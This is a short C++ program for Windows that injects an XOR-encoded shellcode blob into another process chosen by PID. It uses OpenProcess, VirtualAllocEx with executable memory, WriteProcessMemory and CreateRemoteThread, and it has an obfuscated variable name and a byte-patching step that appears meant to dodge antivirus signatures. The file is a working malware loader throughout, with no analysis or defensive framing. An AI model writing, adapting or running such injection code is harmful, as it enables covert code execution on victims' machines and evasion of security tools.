#include <windows.h>
#include <cstdio>

int main(int argc, char *argv[]){
    unsigned char xfveas[] = 
        "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
        "\xff\xff\xff\x48\xbb\x12\xc1\x1b\x2b\x24\x8a\xb3\xa3\x48"
        "\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xee\x89\x98"
        "\xcf\xd4\x62\x73\xa3\x12\xc1\x5a\x7a\x65\xda\xe1\xf2\x44"
        "\x89\x2a\xf9\x41\xc2\x38\xf1\x72\x89\x90\x79\x3c\xc2\x38"
        "\xf1\x32\x89\x90\x59\x74\xc2\xbc\x14\x58\x8b\x56\x1a\xed"
        "\xc2\x82\x63\xbe\xfd\x7a\x57\x26\xa6\x93\xe2\xd3\x08\x16"
        "\x6a\x25\x4b\x51\x4e\x40\x80\x4a\x63\xaf\xd8\x93\x28\x50"
        "\xfd\x53\x2a\xf4\x01\x33\x2b\x12\xc1\x1b\x63\xa1\x4a\xc7"
        "\xc4\x5a\xc0\xcb\x7b\xaf\xc2\xab\xe7\x99\x81\x3b\x62\x25"
        "\x5a\x50\xf5\x5a\x3e\xd2\x6a\xaf\xbe\x3b\xeb\x13\x17\x56"
        "\x1a\xed\xc2\x82\x63\xbe\x80\xda\xe2\x29\xcb\xb2\x62\x2a"
        "\x21\x6e\xda\x68\x89\xff\x87\x1a\x84\x22\xfa\x51\x52\xeb"
        "\xe7\x99\x81\x3f\x62\x25\x5a\xd5\xe2\x99\xcd\x53\x6f\xaf"
        "\xca\xaf\xea\x13\x11\x5a\xa0\x20\x02\xfb\xa2\xc2\x80\x43"
        "\x6a\x7c\xd4\xea\xf9\x53\x99\x5a\x72\x65\xd0\xfb\x20\xfe"
        "\xe1\x5a\x79\xdb\x6a\xeb\xe2\x4b\x9b\x53\xa0\x36\x63\xe4"
        "\x5c\xed\x3e\x46\x62\x9a\xfd\xc0\x91\x4d\xf2\x29\x2b\x24"
        "\xcb\xe5\xea\x9b\x27\x53\xaa\xc8\x2a\xb2\xa3\x12\x88\x92"
        "\xce\x6d\x36\xb1\xa3\x13\x7a\xdb\x83\xfa\x08\xf2\xf7\x5b"
        "\x48\xff\x67\xad\x7b\xf2\x19\x5e\xb6\x3d\x2c\xdb\x5f\xff"
        "\x2a\xf8\xa9\x1a\x2a\x24\x8a\xea\xe2\xa8\xe8\x9b\x40\x24"
        "\x75\x66\xf3\x42\x8c\x2a\xe2\x69\xbb\x73\xeb\xed\x01\x53"
        "\xa2\xe6\xc2\x4c\x63\x5a\x48\xda\x6a\x9e\x60\xbc\x7c\xf2"
        "\x3e\xce\x63\xad\x4d\xd9\xb3\x53\x99\x57\xa2\xc6\xc2\x3a"
        "\x5a\x53\x7b\x82\x8e\x50\xeb\x4c\x76\x5a\x40\xdf\x6b\x26"
        "\x8a\xb3\xea\xaa\xa2\x76\x4f\x24\x8a\xb3\xa3\x12\x80\x4b"
        "\x6a\x74\xc2\x3a\x41\x45\x96\x4c\x66\x15\x4a\xd9\xae\x4b"
        "\x80\x4b\xc9\xd8\xec\x74\xe7\x36\x95\x1a\x2a\x6c\x07\xf7"
        "\x87\x0a\x07\x1b\x43\x6c\x03\x55\xf5\x42\x80\x4b\x6a\x74"
        "\xcb\xe3\xea\xed\x01\x5a\x7b\x6d\x75\x7b\xee\x9b\x00\x57"
        "\xa2\xe5\xcb\x09\xda\xde\xfe\x9d\xd4\xf1\xc2\x82\x71\x5a"
        "\x3e\xd1\xa0\x2a\xcb\x09\xab\x95\xdc\x7b\xd4\xf1\x31\x43"
        "\x16\xb0\x97\x5a\x91\x82\x1f\x0e\x3e\xed\x14\x53\xa8\xe0"
        "\xa2\x8f\xa5\x6e\xcb\x9b\xd0\xc4\xff\xb6\x18\x55\xd2\x69"
        "\x44\x4e\x8a\xea\xe2\x9b\x1b\xe4\xfe\x24\x8a\xb3\xa3";

    char first[] = "\x48\x31\xc9\x48\x81\xe9\xc6";


    HANDLE procHandle;
    HANDLE remoteThread;
    PVOID remoteBuff;

    procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    remoteBuff = VirtualAllocEx(procHandle, NULL, sizeof(xfveas), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    memcpy(xfveas, first, 7);
    WriteProcessMemory(procHandle, remoteBuff, xfveas, sizeof(xfveas), NULL);
    remoteThread = CreateRemoteThread(procHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuff, NULL, 0, NULL);
    CloseHandle(procHandle);

    return 0;
}
